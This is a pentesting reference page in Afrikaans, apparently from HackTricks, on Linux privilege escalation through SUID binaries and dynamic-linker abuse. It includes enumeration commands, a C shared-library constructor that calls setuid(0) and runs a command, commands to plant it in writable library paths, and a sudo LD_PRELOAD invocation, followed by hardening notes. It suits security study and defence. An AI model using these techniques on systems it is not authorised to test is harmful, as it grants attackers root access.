# SUID Shared Library and Linker Abuse

SUID binaries word gewoonlik nagegaan vir direkte command execution, maar custom SUID-programme kan ook kwesbaar wees deur die dynamic linker. Die algemene tema is eenvoudig: ’n executable met verhoogde privileges laai code vanaf ’n path of configuration wat ’n gebruiker met laer privileges kan beïnvloed.<sup>[[1]](#references)</sup>

Hierdie bladsy fokus op generiese tegniekpatrone: ontbrekende libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` deur sudo, linker configuration, en SUID-hardlinkverwarring.

## Vinnige Enumerasie

Begin deur ongewone SUID-lêers te vind en te kontroleer of hulle dinamies gelink is:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Fokus op nie-standaard liggings, pasgemaakte toepassingpaaie, binaries wat deur root besit word maar buite pakketbestuurde gidse geleë is, en dependencies wat vanaf skryfbare gidse gelaai word.<sup>[[1]](#references)</sup>

Nuttige skryfbaarheidskontroles:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Sommige custom SUID-binaries probeer om ’n shared object te laai wat nie bestaan nie. As die ontbrekende pad onder ’n gids is wat deur die aanvaller beheer word, kan die binary aanvaller-verskafde code as die effektiewe gebruiker laai.<sup>[[1]](#references)</sup>

Vind mislukte library-lookups met `strace` se syscall-filter:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Indien die binary ’n skryfbare pad vir `libexample.so` deursoek, kan ’n minimale proof library ’n constructor gebruik. Hou die proof-of-impact onskadelik tydens validering:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Bou dit met die presiese lêernaam wat die binary probeer laai:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Die uitbuitbare toestand is nie slegs die ontbrekende library nie. Die aanvaller moet ’n versoenbare shared object kan plaas by ’n pad wat die bevoorregte loader sal aanvaar.<sup>[[1]](#references)</sup>

## Skryfbare Library Directory

Soms bestaan al die afhanklikhede, maar een van die gidse wat gebruik word om hulle op te los, is skryfbaar. Dit kan dit moontlik maak om ’n gelaaide library te vervang of ’n library met dieselfde naam en ’n hoër prioriteit te plant.<sup>[[1]](#references)</sup>

Hersien die afhanklikheidspaaie:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Indien die gids skryfbaar is, valideer dit met ’n kopie-veilige benadering in ’n lab. Deur stelselbiblioteke op ’n aktiewe host te vervang, kan prosesse wat gelyktydig begin, met inkonsekwente biblioteekweergawes gelaat word.<sup>[[8]](#references)</sup>

## RPATH en RUNPATH

`RPATH` en `RUNPATH` is dynamic-section-inskrywings wat vir die loader aandui waar om na biblioteke te soek. Hulle is gevaarlik in SUID-programme wanneer hulle na attacker-writable-gidse wys.<sup>[[1]](#references)</sup>

Bespeur hulle:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Voorbeeld van riskante uitvoer:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
As `/opt/app/lib` skryfbaar is en die binary `libcustom.so` benodig, kan die attacker moontlik ’n kwaadwillige `libcustom.so` daar plaas:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` en `RUNPATH` is nie in alle resolusiebesonderhede identies nie, maar vir privilege-escalation review is die praktiese vraag dieselfde: soek die SUID-binary in ’n directory wat deur ’n attacker geskryf kan word na ’n library name?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH en SUID

Vir normale programme kan `LD_PRELOAD` en `LD_LIBRARY_PATH` die laai van shared objects afdwing of beïnvloed. Vir SUID-programme gaan die dynamic loader normaalweg in secure-execution mode en ignoreer dit gevaarlike environment variables.<sup>[[1]](#references)</sup>

Dit beteken dat ’n gewone SUID-binary gewoonlik nie kwesbaar is bloot omdat die user `LD_PRELOAD` kan stel nie:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Die algemene uitsondering is ’n sudo-beleid wat toelaat dat loader-veranderlikes vir die teikenopdrag gestel of behou word. Inspekteer `sudo -l` vir inskrywings soos `env_keep+=LD_PRELOAD` of `env_keep+=LD_LIBRARY_PATH`; indien die teiken dinamies gekoppel is, kan dit aanvallerbeheerde kode laai:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Moenie hierdie gevalle verwar nie; die loader- en sudo-beleidsreëls hierbo onderskei hulle:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` teenoor ’n normale SUID binary: gewoonlik geblokkeer deur secure execution.
- `LD_PRELOAD` wat deur sudo behou word: moontlik exploitable.
- Ontbrekende `.so` in ’n writable path: exploitable wanneer die SUID binary daardie path natuurlik laai.
- `RPATH`/`RUNPATH` na ’n writable directory: exploitable wanneer ’n benodigde library beheer kan word.
- `/etc/ld.so.preload` of linker config write access: stelselwyd en met ’n groot impak.

## Linker Configuration

`ld.so` gebruik die linker cache en `/etc/ld.so.preload`; `ldconfig` bou daardie cache vanaf `/etc/ld.so.conf` en lêers wat daaruit ingesluit word, gewoonlik `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Kontroles met ’n hoë waarde:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Skryfbare linker-konfigurasie is gewoonlik ernstiger as ’n enkele kwesbare SUID-binêre, omdat dit baie dinamies gekoppelde prosesse kan beïnvloed. `/etc/ld.so.preload` is besonder gevaarlik omdat dit ’n shared object in bevoorregte prosesse kan forseer.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID-hardlink-verwarring

Hardlinks kan veroorsaak dat dieselfde SUID-inode onder verskeie name verskyn.<sup>[[9]](#references)</sup> Dit is nuttig om ’n bevoorregte helper weg te steek, opruiming te verwar of naïewe padgebaseerde hersiening te omseil.

Vind SUID-lêers met meer as een skakel:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspekteer alle paaie na dieselfde inode:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Die misbruik is nie dat ’n hardlink permissions verander nie. Die misbruik is padverwarring: ’n bevoorregte inode kan bereikbaar wees deur ’n naam wat defenders of scripts nie verwag nie.<sup>[[9]](#references)</sup> Vir ’n dieper bespreking van inode- en hardlink-workflows, sien [Lêerstelsel, Inodes en Herstel](../main-system-information/filesystem-inodes-and-recovery.md).

## Verdedigingsnotas

- Hou SUID binaries minimaal, geoudit en waar moontlik deur ’n package manager bestuur.
- Vermy `RPATH`/`RUNPATH`-inskrywings wat na skryfbare of deur die toepassing bestuurde gidse wys.<sup>[[1]](#references)[[8]](#references)</sup>
- Hou library-gidse root-owned en nie-skryfbaar vir gewone gebruikers nie.<sup>[[8]](#references)</sup>
- Moenie `LD_PRELOAD`, `LD_LIBRARY_PATH` of soortgelyke loader-veranderlikes deur sudo behou nie.<sup>[[1]](#references)[[5]](#references)</sup>
- Monitor `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` en onverwagte SUID-lêers.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Hersien hardlinked SUID-lêers en ondersoek pasgemaakte SUID-wrappers buite standaardstelselpaaie.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux-handleidingbladsy](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Algemene Attribute (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Hardening van die dinamiese linker (Die GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
